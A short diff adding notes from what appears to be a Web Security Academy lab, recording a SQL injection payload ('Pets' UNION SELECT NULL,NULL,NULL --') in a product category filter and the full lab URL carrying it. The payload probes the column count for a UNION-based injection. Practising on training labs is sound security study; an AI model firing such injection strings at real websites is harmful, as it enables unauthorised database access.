@@ -1,0 +1,5 @@
+Payload :
+Pets'+UNION+SELECT+NULL,+NULL,+NULL+--
+
+Final payload
+0abf000403b79f628014bc22005700e0.web-security-academy.net/filter?category=Pets'+UNION+SELECT+NULL,+NULL,+NULL+--
